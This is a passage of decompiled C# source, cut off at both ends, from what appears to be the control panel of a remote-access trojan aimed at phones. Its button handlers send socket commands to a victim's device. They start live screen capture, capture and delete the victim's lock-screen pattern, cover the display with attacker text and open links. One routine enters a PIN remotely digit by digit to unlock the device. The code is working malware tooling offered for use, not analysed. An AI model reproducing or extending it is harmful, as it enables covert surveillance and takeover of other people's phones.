				object[] array = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"pst<*>",
						this.textsend.Text,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
				this.textsend.Text = "";
			}
		}

		// Token: 0x060002FB RID: 763 RVA: 0x00002423 File Offset: 0x00000623
		private void pictureBox7_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060002FC RID: 764 RVA: 0x000492DC File Offset: 0x000474DC
		private void PictureBox14_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKeb",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002FD RID: 765 RVA: 0x000488E0 File Offset: 0x00046AE0
		private void PictureBox10_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002FE RID: 766 RVA: 0x00049524 File Offset: 0x00047724
		private void PictureBox12_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKnn",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002FF RID: 767 RVA: 0x00002D24 File Offset: 0x00000F24
		private void PictureBox9_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000300 RID: 768 RVA: 0x00049648 File Offset: 0x00047848
		private void PictureBox11_Click(object sender, EventArgs e)
		{
			PictureBox pictureBox = (PictureBox)sender;
			if (pictureBox.Tag == null || Convert.ToString(pictureBox.Tag) == "Unselected")
			{
				pictureBox.Tag = "Selected";
				pictureBox.BorderStyle = BorderStyle.Fixed3D;
			}
			else
			{
				pictureBox.Tag = "Unselected";
				pictureBox.BorderStyle = BorderStyle.None;
			}
			if (Convert.ToString(pictureBox.Tag) == "Selected")
			{
				this.Livepicbox.Enabled = true;
				this.LIVE = true;
				if (this.classClient == null)
				{
					return;
				}
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>SK",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			if (this.classClient != null)
			{
				try
				{
					string[] array3 = this.classClient.Keys.Split(new char[] { ':' });
					object[] array4 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>SK",
							Data.SPL_SOCKET,
							array3[0],
							Data.SPL_SOCKET,
							array3[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array4);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000301 RID: 769 RVA: 0x00049900 File Offset: 0x00047B00
		private void StartButton_Click(object sender, EventArgs e)
		{
			if (this.classClient != null && !this.LIVE)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sc:on:",
							this.Qualtibox.Text,
							"~",
							this.FPSBOX.Text,
							"~",
							this.classClient.ClientRemoteAddress,
							"~",
							MySettingsProperty.Settings.resolution,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
					this.toptitle.Text = "Connecting , Please Wait...";
					this.StartButton.Enabled = false;
					this.Guna2Button2.Enabled = true;
					this.vewpnl.Enabled = true;
					this.Livepicbox.Enabled = true;
					this.LIVE = true;
					this.refreshtimer.Enabled = true;
					this.refreshtimer.Start();
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000302 RID: 770 RVA: 0x00049AF0 File Offset: 0x00047CF0
		private void Guna2Button2_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sc:off",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.toptitle.Text = "...";
					this.classClient.SendMessage(array2);
					this.StartButton.Enabled = true;
					this.Guna2Button2.Enabled = false;
					this.toptitle.Text = " ";
					this.vewpnl.Enabled = false;
					this.Livepicbox.Enabled = false;
					this.LIVE = false;
					this.refreshtimer.Stop();
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000303 RID: 771 RVA: 0x00002D2D File Offset: 0x00000F2D
		private void Guna2Button5_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000304 RID: 772 RVA: 0x00049C80 File Offset: 0x00047E80
		private void DrakeUILabel1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (e.Button == MouseButtons.Left)
				{
					Codes.ReleaseCapture();
					Codes.SendMessage(base.Handle, 161, 2, 0);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000305 RID: 773 RVA: 0x00049CC8 File Offset: 0x00047EC8
		private void drakeUIAvatar5_Click_1(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lnk<*>",
							reso.ChekLink(this.textsend.Text),
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000306 RID: 774 RVA: 0x00049E0C File Offset: 0x0004800C
		private void drakeUIAvatar14_Click(object sender, EventArgs e)
		{
			if (this.isSymbolChanged)
			{
				this.drakeUIAvatar14.Symbol = 62042;
				this.isSymbolChanged = false;
				this.drakeUIAvatar14.ForeColor = Color.FromArgb(128, 128, 255);
				if (this.LIVE)
				{
					this.iscontroled = true;
					if (this.classClient != null)
					{
						string[] array = this.classClient.Keys.Split(new char[] { ':' });
						object[] array2 = new object[]
						{
							this.classClient.myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"pslock<*>disallow",
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array2);
						return;
					}
				}
			}
			else
			{
				this.drakeUIAvatar14.Symbol = 62042;
				this.isSymbolChanged = true;
				this.drakeUIAvatar14.ForeColor = Color.LimeGreen;
				this.iscontroled = true;
				if (this.classClient != null)
				{
					string[] array3 = this.classClient.Keys.Split(new char[] { ':' });
					object[] array4 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"pslock<*>allow",
							Data.SPL_SOCKET,
							array3[0],
							Data.SPL_SOCKET,
							array3[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array4);
				}
			}
		}

		// Token: 0x06000307 RID: 775 RVA: 0x000488E0 File Offset: 0x00046AE0
		private void drakeUIAvatar8_Click_1(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000308 RID: 776 RVA: 0x00002D35 File Offset: 0x00000F35
		private void drakeUIAvatar9_Click_1(object sender, EventArgs e)
		{
			this.LKeb();
		}

		// Token: 0x06000309 RID: 777 RVA: 0x0004A0B4 File Offset: 0x000482B4
		private void LockKey0()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK0",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600030A RID: 778 RVA: 0x0004A1D8 File Offset: 0x000483D8
		private void LockKey1()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK1",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600030B RID: 779 RVA: 0x0004A2FC File Offset: 0x000484FC
		private void LockKey2()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK2",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600030C RID: 780 RVA: 0x0004A420 File Offset: 0x00048620
		private void LockKey3()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK3",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600030D RID: 781 RVA: 0x0004A544 File Offset: 0x00048744
		private void LockKey4()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK4",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600030E RID: 782 RVA: 0x0004A668 File Offset: 0x00048868
		private void LockKey5()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK5",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600030F RID: 783 RVA: 0x0004A78C File Offset: 0x0004898C
		private void LockKey6()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK6",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000310 RID: 784 RVA: 0x0004A8B0 File Offset: 0x00048AB0
		private void LockKey7()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK7",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000311 RID: 785 RVA: 0x0004A9D4 File Offset: 0x00048BD4
		private void LockKey8()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK8",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000312 RID: 786 RVA: 0x0004AAF8 File Offset: 0x00048CF8
		private void LockKey9()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK9",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000313 RID: 787 RVA: 0x0004AC1C File Offset: 0x00048E1C
		private void LKej()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKej",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000314 RID: 788 RVA: 0x000492DC File Offset: 0x000474DC
		private void LKeb()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKeb",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000315 RID: 789 RVA: 0x00002D3D File Offset: 0x00000F3D
		private void AddNumberToQueue(int number)
		{
			this.numberQueue.Enqueue(number);
		}

		// Token: 0x06000316 RID: 790 RVA: 0x0004AD40 File Offset: 0x00048F40
		private void ExecuteKeyFunction(int number)
		{
			switch (number)
			{
			case 0:
				this.LockKey0();
				return;
			case 1:
				this.LockKey1();
				return;
			case 2:
				this.LockKey2();
				return;
			case 3:
				this.LockKey3();
				return;
			case 4:
				this.LockKey4();
				return;
			case 5:
				this.LockKey5();
				return;
			case 6:
				this.LockKey6();
				return;
			case 7:
				this.LockKey7();
				return;
			case 8:
				this.LockKey8();
				return;
			case 9:
				this.LockKey9();
				return;
			default:
				return;
			}
		}

		// Token: 0x06000317 RID: 791 RVA: 0x0004ADC4 File Offset: 0x00048FC4
		private void drakeUIAvatar13_Click(object sender, EventArgs e)
		{
			this.timer12.Interval = this.interval;
			this.timer12.Tick += this.timer12_Tick;
			if (this.classClient == null)
			{
				return;
			}
			Dialog1 dialog = new Dialog1();
			dialog.Title = "Enter PIN Lock";
			dialog.ShowDialog();
			if (dialog.DialogResult != DialogResult.OK)
			{
				return;
			}
			if (!this.isExecuting)
			{
				string theText = dialog.TheText;
				foreach (char c in theText)
				{
					if (!char.IsDigit(c))
					{
						EagleAlert.ShowError("Invalid input. Please enter only numbers.");
						return;
					}
					int num = int.Parse(c.ToString());
					this.AddNumberToQueue(num);
				}
				this.timer12.Start();
				this.isExecuting = true;
				return;
			}
			EagleAlert.Showinformation("Please wait...");
		}

		// Token: 0x06000318 RID: 792 RVA: 0x0004AE98 File Offset: 0x00049098
		private void timer12_Tick(object sender, EventArgs e)
		{
			if (this.numberQueue.Count > 0)
			{
				int num = this.numberQueue.Dequeue();
				this.ExecuteKeyFunction(num);
				return;
			}
			this.timer12.Stop();
			this.isExecuting = false;
			EagleAlert.Showinformation("Keys entered successfully");
			this.LKej();
		}

		// Token: 0x06000319 RID: 793 RVA: 0x00002423 File Offset: 0x00000623
		private void checkblock_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600031A RID: 794 RVA: 0x00002CA4 File Offset: 0x00000EA4
		private void guna2CustomGradientPanel1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Button5.ReleaseCapture();
				Button5.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x0600031B RID: 795 RVA: 0x00002CA4 File Offset: 0x00000EA4
		private void guna2CustomGradientPanel2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Button5.ReleaseCapture();
				Button5.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x0600031C RID: 796 RVA: 0x0004AEEC File Offset: 0x000490EC
		private void drakeUIAvatar2_Click_1(object sender, EventArgs e)
		{
			using (Msgbox msgbox = new Msgbox())
			{
				msgbox.BodyText1 = "Remove captured lock screen";
				msgbox.MessageText1 = "By allowing you delete current captured lock screen  can recapture the lock screen if it did not captured correctly, Are you sure?";
				DialogResult dialogResult = msgbox.ShowDialog();
				if (dialogResult == DialogResult.OK && this.classClient != null)
				{
					try
					{
						string[] array = this.classClient.Keys.Split(new char[] { ':' });
						object[] array2 = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"sp<*>LKnn",
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array2);
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x0600031D RID: 797 RVA: 0x0004B06C File Offset: 0x0004926C
		private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			TcpClient myClient = this.classClient.myClient;
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			if (this.guna2ToggleSwitch1.Checked)
			{
				if (this.classClient != null)
				{
					Dialog1 dialog = new Dialog1();
					dialog.Title = "Text on Display";
					dialog.ShowDialog();
					if (dialog.DialogResult == DialogResult.OK)
					{
						object[] array2 = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"Blkt<*>",
								dialog.TheText,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array2);
					}
					object[] array3 = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"BLKV<*>on",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
